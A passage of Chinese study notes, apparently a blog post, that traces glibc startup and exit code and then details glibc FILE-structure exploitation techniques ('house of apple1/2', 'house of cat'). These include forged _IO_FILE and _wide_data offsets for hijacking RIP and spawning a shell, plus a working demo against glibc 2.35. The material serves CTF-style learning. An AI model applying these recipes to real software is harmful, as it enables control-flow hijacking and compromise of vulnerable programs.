must be avoided.  */  _dl_relocate_static_pie ();  /* Perform IREL&#123;,A&#125; relocations.  */  ARCH_SETUP_IREL ();  /* The stack guard goes into the TCB, so initialize it early.  */  ARCH_SETUP_TLS ();  /* In some architectures, IREL&#123;,A&#125; relocations happen after TLS setup in     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc&#x27;s     hwcap and platform fields available in the TCB.  */  ARCH_APPLY_IREL ();  /* Set up the stack checker&#x27;s canary.  */  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD  THREAD_SET_STACK_GUARD (stack_chk_guard);# else  __stack_chk_guard = stack_chk_guard;# endif# ifdef DL_SYSDEP_OSCHECK  &#123;    /* This needs to run to initiliaze _dl_osversion before TLS       setup might check it.  */    DL_SYSDEP_OSCHECK (__libc_fatal);  &#125;# endif  /* Initialize libpthread if linked in.  */  if (__pthread_initialize_minimal != NULL)    __pthread_initialize_minimal ();  /* Set up the pointer guard value.  */  uintptr_t pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,							 stack_chk_guard);# ifdef THREAD_SET_POINTER_GUARD  THREAD_SET_POINTER_GUARD (pointer_chk_guard);# else  __pointer_chk_guard_local = pointer_chk_guard;# endif#endif /* !SHARED  */  /* Register the destructor of the dynamic linker if there is any.  */  if (__glibc_likely (rtld_fini != NULL))    __cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);#ifndef SHARED  /* Perform early initialization.  In the shared case, this function     is called from the dynamic loader as early as possible.  */  __libc_early_init (true);  /* Call the initializer of the libc.  This is only needed here if we     are compiling for the static library in which case we haven&#x27;t     run the constructors in `_dl_start_user&#x27;.  */  __libc_init_first (argc, argv, __environ);  /* Register the destructor of the statically-linked program.  */  __cxa_atexit (call_fini, NULL, NULL);  /* Some security at this point.  Prevent starting a SUID binary where     the standard file descriptors are not opened.  We have to do this     only for statically linked applications since otherwise the dynamic     loader did the work already.  */  if (__builtin_expect (__libc_enable_secure, 0))    __libc_check_standard_fds ();#endif /* !SHARED */  /* Call the initializer of the program, if any.  */#ifdef SHARED  if (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, 0))    GLRO(dl_debug_printf) (&quot;\ninitialize program: %s\n\n&quot;, argv[0]);  if (init != NULL)    /* This is a legacy program which supplied its own init       routine.  */    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);  else    /* This is a current program.  Use the dynamic segment to find       constructors.  */    call_init (argc, argv, __environ);  /* Auditing checkpoint: we have a new object.  */  _dl_audit_preinit (GL(dl_ns)[LM_ID_BASE]._ns_loaded);  if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))    GLRO(dl_debug_printf) (&quot;\ntransferring control: %s\n\n&quot;, argv[0]);#else /* !SHARED */  call_init (argc, argv, __environ);  _dl_debug_initialize (0, LM_ID_BASE);#endif  __libc_start_call_main (main, argc, argv MAIN_AUXVEC_PARAM);&#125;/* Starting with glibc 2.34, the init parameter is always NULL.  Older   libcs are not prepared to handle that.  The macro   DEFINE_LIBC_START_MAIN_VERSION creates GLIBC_2.34 alias, so that   newly linked binaries reflect that dependency.  The macros below   expect that the exported function is called   __libc_start_main_impl.  */
自glibc2.34以后，init和fini两个参数已经废弃，可以看到，其内部自行使用了call_init函数 /* Initialization for dynamic executables.  Find the main executable   link map and run its init functions.  */static voidcall_init (int argc, char **argv, char **env)&#123;  /* Obtain the main map of the executable.  */  struct link_map *l = GL(dl_ns)[LM_ID_BASE]._ns_loaded;  /* DT_PREINIT_ARRAY is not processed here.  It is already handled in     _dl_init in elf/dl-init.c.  Also see the call_init function in     the same file.  */  if (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_INIT] != NULL)    DL_CALL_DT_INIT(l, l-&gt;l_addr + l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr,		    argc, argv, env);  ElfW(Dyn) *init_array = l-&gt;l_info[DT_INIT_ARRAY];  if (init_array != NULL)    &#123;      unsigned int jm	= l-&gt;l_info[DT_INIT_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr));      ElfW(Addr) *addrs = (void *) (init_array-&gt;d_un.d_ptr + l-&gt;l_addr);      for (unsigned int j = 0; j &lt; jm; ++j)	((dl_init_t) addrs[j]) (argc, argv, env);    &#125;&#125;/* Initialization for static executables.  There is no dynamic   segment, so we access the symbols directly.  */static voidcall_init (int argc, char **argv, char **envp)&#123;  /* For static executables, preinit happens right before init.  */  &#123;    const size_t size = __preinit_array_end - __preinit_array_start;    size_t i;    for (i = 0; i &lt; size; i++)      (*__preinit_array_start [i]) (argc, argv, envp);  &#125;# if ELF_INITFINI  _init ();# endif  const size_t size = __init_array_end - __init_array_start;  for (size_t i = 0; i &lt; size; i++)      (*__init_array_start [i]) (argc, argv, envp);&#125;
可以看到这里，对于动态链接程序先获取link_map，然后执行.init，再遍历 .init_array 函数数组，执行程序和共享库的所有构造函数。而对于动态链接器的构造函数则由另一个函数_dl_init再调用call_init执行，这个函数如下 void_dl_init (struct link_map *main_map, int argc, char **argv, char **env)&#123;  ElfW(Dyn) *preinit_array = main_map-&gt;l_info[DT_PREINIT_ARRAY];  ElfW(Dyn) *preinit_array_size = main_map-&gt;l_info[DT_PREINIT_ARRAYSZ];  unsigned int i;  if (__glibc_unlikely (GL(dl_initfirst) != NULL))    &#123;      call_init (GL(dl_initfirst), argc, argv, env);      GL(dl_initfirst) = NULL;    &#125;  /* Don&#x27;t do anything if there is no preinit array.  */  if (__builtin_expect (preinit_array != NULL, 0)      &amp;&amp; preinit_array_size != NULL      &amp;&amp; (i = preinit_array_size-&gt;d_un.d_val / sizeof (ElfW(Addr))) &gt; 0)    &#123;      ElfW(Addr) *addrs;      unsigned int cnt;      if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))	_dl_debug_printf (&quot;\ncalling preinit: %s\n\n&quot;,			  DSO_FILENAME (main_map-&gt;l_name));      addrs = (ElfW(Addr) *) (preinit_array-&gt;d_un.d_ptr + main_map-&gt;l_addr);      for (cnt = 0; cnt &lt; i; ++cnt)	((dl_init_t) addrs[cnt]) (argc, argv, env);    &#125;  /* Stupid users forced the ELF specification to be changed.  It now     says that the dynamic loader is responsible for determining the     order in which the constructors have to run.  The constructors     for all dependencies of an object must run before the constructor     for the object itself.  Circular dependencies are left unspecified.     This is highly questionable since it puts the burden on the dynamic     loader which has to find the dependencies at runtime instead of     letting the user do it right.  Stupidity rules!  */  i = main_map-&gt;l_searchlist.r_nlist;  while (i-- &gt; 0)    call_init (main_map-&gt;l_initfini[i], argc, argv, env);#ifndef HAVE_INLINED_SYSCALLS  /* Finished starting up.  */  _dl_starting_up = 0;#endif&#125; _dl_init又由谁调用呢？这里发现另一个_start(?)，位于dl-start.S（动态链接器的入口点），上文的_start位于start.S（程序的入口点）
/* Initial entry point code for the dynamic linker.   The function _dl_start is the real entry point;   it&#x27;s return value is the user program&#x27;s entry point.  */ENTRY (_start)	/* Count arguments in r11 */	l.ori	r3, r1, 0	l.movhi	r11, 01:	l.addi	r3, r3, 4	l.lwz	r12, 0(r3)	l.sfnei	r12, 0	l.addi	r11, r11, 1	l.bf	1b	 l.nop	l.addi	r11, r11, -1	/* store argument counter to stack.  */	l.sw	0(r1), r11	/* Load the PIC register.  */	l.jal	0x8	 l.movhi r16, gotpchi(_GLOBAL_OFFSET_TABLE_-4)	l.ori	r16, r16, gotpclo(_GLOBAL_OFFSET_TABLE_+0)	l.add	r16, r16, r9	l.ori	r3, r1, 0	l.jal	_dl_start	 l.nop	/* Save user entry in a call saved reg.  */	l.ori	r22, r11, 0	/* Fall through to _dl_start_user.  */_dl_start_user:	/* Set up for _dl_init.  */	/* Load _rtld_local (a.k.a _dl_loaded).  */	l.lwz	r12, got(_rtld_local)(r16)	l.lwz	r3, 0(r12)	/* Load argc */	l.lwz	r18, got(_dl_argc)(r16)	l.lwz	r4, 0(r18)	/* Load argv */	l.lwz	r20, got(_dl_argv)(r16)	l.lwz	r5, 0(r20)	/* Load envp = &amp;argv[argc + 1].  */	l.slli	r6, r4, 2	l.addi	r6, r6, 4	l.add	r6, r6, r5	l.jal	plt(_dl_init)	 l.nop	/* Now set up for user entry.	   The already defined ABI loads argc and argv from the stack.	   argc = 0(r1)	   argv = r1 + 4	*/	/* Load SP as argv - 4.  */	l.lwz	r3, 0(r20)	l.addi	r1, r3, -4	/* Save argc.  */	l.lwz	r3, 0(r18)	l.sw	0(r1), r3	/* Pass _dl_fini function address to _start.	   Next start.S will then pass this as rtld_fini to __libc_start_main.  */	l.lwz	r3, got(_dl_fini)(r16)	l.jr	r22	 l.nopEND (_start)
发现正是这里调用了_dl_start和_dl_init
如此完成初始化构造，可以看到call_fini（静态链接程序），rtld_fini（动态链接程序）也是在__libc_start_main完成注册的 __cxa_atexit ((void (*) (void *)) rtld_fini, NULL, NULL);.../* Register the destructor of the statically-linked program.  */__cxa_atexit (call_fini, NULL, NULL);
在__libc_start_main的最后 __libc_start_call_main (main, argc, argv MAIN_AUXVEC_PARAM);_Noreturn static __always_inline void__libc_start_call_main (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL),                        int argc, char **argv MAIN_AUXVEC_DECL)&#123;  exit (main (argc, argv, __environ MAIN_AUXVEC_PARAM));&#125;
正是它最终调用main以及exit，同时这也解释了为什么main函数返回地址总是在__libc_start_call_main的一定偏移处。
现在我们再看被注册的rtld_fini，其实际调用_dl_fini函数，作用是调用进程空间中所有模块的析构函数，也就是遍历.fini_array，看其源码的这一段
/* Is there a destructor function?  */if (l-&gt;l_info[DT_FINI_ARRAY] != NULL    || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))&#123;    /* When debugging print a message first.  */    if (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, 0))        _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,                          DSO_FILENAME (l-&gt;l_name),                          ns);    /* First see whether an array is given.  */    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)    &#123;        ElfW(Addr) *array =            (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);        unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                          / sizeof (ElfW(Addr)));        while (i-- &gt; 0)            ((fini_t) array[i]) ();    &#125;    /* Next try the old-style destructor.  */    if (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL)        DL_CALL_DT_FINI            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);&#125;
这里执行了.fini以及遍历了.fini_array
总结

内核执行execve()系统调用
加载ELF可执行文件

动态链接程序：发现.interp段

内核加载动态链接器ld.so
跳转到ld.so入口地址-&gt;_dl_start (dl-start.S)

_dl_init

call_init (执行ld.so自身的.init_array)


ld.so加载依赖库 (libc.so等) 并重定位

跳转到程序入口-&gt;_start (start.S)

静态链接程序：直接跳转到_start (start.S)

_start

__libc_start_main

注册析构函数：

静态链接：__cxa_atexit(call_fini)

程序自身析构器

动态链接：__cxa_atexit(rtld_fini)

动态链接器统一收尾调用dl_fini

call_init(执行程序和libc的.init_array)


__libc_start_call_main

调用main()
exit(main())

用户调用exit(status)

__run_exit_handlers(status)

调用 TLS 析构函数__call_tls_dtors
遍历exit_function_list

ef_cxa：

静态程序：call_fini

执行程序自身.fini_array

动态程序：rtld_fini

_dl_fini

按依赖顺序执行共享库.fini_array/DT_FINI
清理动态链接器资源



ef_at -&gt; atexit注册的函数
ef_on -&gt; on_exit注册的函数
其他类型忽略

若执行期间有新回调注册 → 回到链表开头
释放动态分配的回调节点
若run_list_atexit = true，则执行__libc_atexit钩子：默认为_IO_cleanup()

_exit(status)

内核：彻底终止进程

house of apple2 | house of cat

漏洞产生：_wide_data结构中有一个类似vtable的_wide_vtable指向_IO_jump_t结构，与vtable相同，对glibc中也定义了调用_wide_vtable中函数的宏，其中在 glibc 中真正使用到的有_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE，但与vtable不同的是这三个宏均缺少对_wide_vtable位置的检查 _IO_OVERFLOW： #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) 而_IO_WOVERFLOW： #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)#define _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable

_IO_wfile_overflow

调用链


_IO_wfile_overflow wint_t_IO_wfile_overflow (FILE *f, wint_t wch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)    &#123;      _IO_wdoallocbuf (f);// 需要走到这里      // ......    &#125;    &#125;&#125; 满足条件：


f-&gt;_flags &amp; _IO_NO_WRITES == 0
f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0
f-&gt;_wide_data-&gt;_IO_write_base == 0


_IO_wdoallocbuf void_IO_wdoallocbuf (FILE *fp)&#123;  if (fp-&gt;_wide_data-&gt;_IO_buf_base)    return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用      return;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);&#125;libc_hidden_def (_IO_wdoallocbuf) 满足条件：


fp-&gt;_wide_data-&gt;_IO_buf_base == 0
fp-&gt;_flags &amp; _IO_UNBUFFERED == 0


_IO_WDOALLOCATE
*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)

综上所述： * _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为;sh; * vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可 * _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0 * _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 * _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B * _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
_IO_wfile_underflow_mmap

调用链


_IO_wfile_underflow_mmap static wint_t_IO_wfile_underflow_mmap (FILE *fp)&#123;  struct _IO_codecvt *cd;  const char *read_stop;   if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   /* Maybe there is something left in the external buffer.  */  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end      /* No.  But maybe the read buffer is not fully set up.  */      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */    return WEOF;   /* There is more in the external.  Convert it.  */  read_stop = (const char *) fp-&gt;_IO_read_ptr;   if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)    &#123;      free (fp-&gt;_wide_data-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    &#125;      _IO_wdoallocbuf (fp);// 需要走到这里    &#125;    //......&#125; 满足条件：


fp-&gt;_flags &amp; _IO_NO_READS == 0
fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end
fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end
fp-&gt;_wide_data-&gt;_IO_buf_base == NULL，fp-&gt;_wide_data-&gt;_IO_save_base == NULL


_IO_wdoallocbuf
_IO_WDOALLOCATE
*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)

综上所述： * _flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为;sh; * vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow_mmap即可 * _IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10) * _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8) * _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0 * _wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0 * _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B * _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
_IO_wdefault_xsgetn

调用链


_IO_wdefault_xsgetn size_t_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)&#123;  size_t more = n;  wchar_t *s = (wchar_t*) data;  for (;;)    &#123;      /* Data available. */      ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);      if (count &gt; 0)    &#123;      if ((size_t) count &gt; more)        count = more;      if (count &gt; 20)        &#123;          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;        &#125;      else if (count &lt;= 0)        count = 0;      else        &#123;          wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;          int i = (int) count;          while (--i &gt;= 0)        *s++ = *p++;          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;            &#125;            more -= count;        &#125;      if (more == 0 || __wunderflow (fp) == WEOF)    break;    &#125;  return n - more;&#125;libc_hidden_def (_IO_wdefault_xsgetn) 满足条件：


由于more是第三个参数，所以不能为0，即rdx寄存器不为0
直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支


__wunderflow

wint_t__wunderflow (FILE *fp)&#123;  if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))    return WEOF;   if (fp-&gt;_mode == 0)    _IO_fwide (fp, 1);  if (_IO_in_put_mode (fp))    if (_IO_switch_to_wget_mode (fp) == EOF)      return WEOF;    // ......&#125;
满足条件： * 设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0

_IO_switch_to_wget_mode

int_IO_switch_to_wget_mode (FILE *fp)&#123;  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里      return EOF;    // .....&#125;
满足条件： * fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base

_IO_WOVERFLOW
*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)

综上所述： * _flags设置为0x800 * vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可 * _mode设置为大于0，即满足*(fp + 0xc0) &gt; 0 * _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_read_ptr == _wide_data-&gt;_IO_read_end，即满足*A == *(A + 8) * _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18) * _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B * _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
_IO_wfile_seekoff(house of cat)

调用链


_IO_wfile_seekoff off64_t _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode) &#123; 	off64_t result; 	off64_t delta, new_offset; 	long int count; 	/*短路变成一个单独的功能。 我们不想混合任何功能，也不想触及 FILE 对象内部的任何内容。*/ 	if (mode == 0) 		return do_ftell_wide (fp); 			...	bool was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) || _IO_in_put_mode (fp)); 	/*刷新未写入的字符。（如果我们在缓冲区内查找，这可能会执行不必要的写入。但是为了能够切换到阅读，我们需要将 egptr 设置为 pptr。 这在当前的设计中是无法做到的，它假设 file_ptr（） 是 eGptr。 无论如何，由于我们可能在close()时最终刷新，因此没有太大区别。FIXME：模拟内存映射文件。*/ 	if (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) 		return WEOF; 满足条件：


_mode不为0
fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base或 (fp)-&gt;_flags &amp; 0x0800 != 0


_IO_switch_to_wget_mode 满足条件：


fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base


_IO_WOVERFLOW
*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)

综上所述： * _flags设置为~0x8，如果不能保证_lock指向可读写内存则_flags |= 0x8000 * vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_seekoff即可 * _mode设置为大于0，即满足*(fp + 0xc0) &gt; 0 * _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A * _wide_data-&gt;_IO_read_ptr &gt; _wide_data-&gt;_IO_read_end，即满足*A &gt; *(A + 8) * _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18) * _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B * _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
house of apple1

核心：在堆上伪造一个_IO_FILE结构体并已知其地址为A，将A + 0xd8(vtable)替换为_IO_wstrn_jumps地址，A + 0xa0(_wide_data)设置为B，并设置其他成员以便能调用到_IO_OVERFLOW，exit函数则会一路调用到_IO_wstrn_overflow函数，并将B至B + 0x30的地址区域的内容都替换为A + 0xf0或者A + 0x1f0 static wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123;  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;  if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)    &#123;      _IO_wsetb (fp, snf-&gt;overflow_buf,         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)                      / sizeof (wchar_t)), 0);      //只要控制了fp-&gt;_wide_data，就可以控制从fp-&gt;_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址。      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf                      + (sizeof (snf-&gt;overflow_buf)                     / sizeof (wchar_t)));    &#125;   fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;  return c;&#125;
有时候需要绕过_IO_wsetb函数里面的free #define _IO_FLAGS2_USER_WBUF 8//设置f-&gt;_flags2为8即可绕过void_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    free (f-&gt;_wide_data-&gt;_IO_buf_base); // 其不为0的时候不要执行到这里  f-&gt;_wide_data-&gt;_IO_buf_base = b;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;  if (a)    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;  else    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;&#125;

demo： #2.35-0ubuntu3#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdint.h&gt;#include&lt;unistd.h&gt;#include &lt;string.h&gt;void main()&#123;    setbuf(stdout, 0);    setbuf(stdin, 0);    setvbuf(stderr, 0, 2, 0);    puts(&quot;[*] allocate a 0x100 chunk&quot;);    size_t *p1 = malloc(0xf0);    size_t *tmp = p1;    size_t old_value = 0x1122334455667788;    for (size_t i = 0; i &lt; 0x100 / 8; i++)    &#123;        p1[i] = old_value;    &#125;    puts(&quot;===========================old value=======================&quot;);    for (size_t i = 0; i &lt; 4; i++)    &#123;        printf(&quot;[%p]: 0x%016lx  0x%016lx\n&quot;, tmp, tmp[0], tmp[1]);        tmp += 2;    &#125;    puts(&quot;===========================old value=======================&quot;);    size_t puts_addr = (size_t)&amp;puts;    printf(&quot;[*] puts address: %p\n&quot;, (void *)puts_addr);    size_t stderr_write_ptr_addr = puts_addr + 0x1997f8;    printf(&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;, (void *)stderr_write_ptr_addr);    size_t stderr_flags2_addr = puts_addr + 0x199844;    printf(&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;, (void *)stderr_flags2_addr);    size_t stderr_wide_data_addr = puts_addr + 0x199870;    printf(&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;, (void *)stderr_wide_data_addr);    size_t sdterr_vtable_addr = puts_addr + 0x1998a8;    printf(&quot;[*] stderr-&gt;vtable address: %p\n&quot;, (void *)sdterr_vtable_addr);    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ef0;    printf(&quot;[*] _IO_wstrn_jumps address: %p\n&quot;, (void *)_IO_wstrn_jumps_addr);    puts(&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;);    *(size_t *)stderr_write_ptr_addr = (size_t)-1;    puts(&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;);    *(size_t *)stderr_flags2_addr = 8;    puts(&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;);    *(size_t *)stderr_wide_data_addr = (size_t)p1;    puts(&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;);    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;    puts(&quot;[+] step 5: call fcloseall and trigger house of apple&quot;);    fcloseall();    tmp = p1;    puts(&quot;===========================new value=======================&quot;);    for (size_t i = 0; i &lt; 4; i++)    &#123;        printf(&quot;[%p]: 0x%016lx  0x%016lx\n&quot;, tmp, tmp[0], tmp[1]);        tmp += 2;    &#125;    puts(&quot;===========================new value=======================&quot;);&#125; 输出结果： [*] allocate a 0x100 chunk===========================old value=======================[0x56142e11b2a0]: 0x1122334455667788  0x1122334455667788[0x56142e11b2b0]: 0x1122334455667788  0x1122334455667788[0x56142e11b2c0]: 0x1122334455667788  0x1122334455667788[0x56142e11b2d0]: 0x1122334455667788  0x1122334455667788===========================old value=======================[*] puts address: 0x7cb7d0280ed0[*] stderr-&gt;_IO_write_ptr address: 0x7cb7d041a6c8[*] stderr-&gt;_flags2 address: 0x7cb7d041a714[*] stderr-&gt;_wide_data address: 0x7cb7d041a740[*] stderr-&gt;vtable address: 0x7cb7d041a778[*] _IO_wstrn_jumps address: 0x7cb7d0415dc0[+] step 1: change stderr-&gt;_IO_write_ptr to -1[+] step 2: change stderr-&gt;_flags2 to 8[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps[+] step 5: call fcloseall and trigger house of apple===========================new value=======================[0x56142e11b2a0]: 0x00007cb7d041a790  0x00007cb7d041a890[0x56142e11b2b0]: 0x00007cb7d041a790  0x00007cb7d041a790[0x56142e11b2c0]: 0x00007cb7d041a790  0x00007cb7d041a790[0x56142e11b2d0]: 0x00007cb7d041a790  0x00007cb7d041a890===========================new value=======================
总结：在只给了1次largebin attack的前提下，能利用_IO_wstrn_overflow函数将任意地址空间上的值修改为一个已知地址，并且这个已知地址通常为堆地址。那么，当我们伪造两个甚至多个_IO_FILE结构体，并将这些结构体通过chain字段串联起来就能进行组合利用
修改tcache线程（&lt; 2.37)

伪造至少两个_IO_FILE结构体
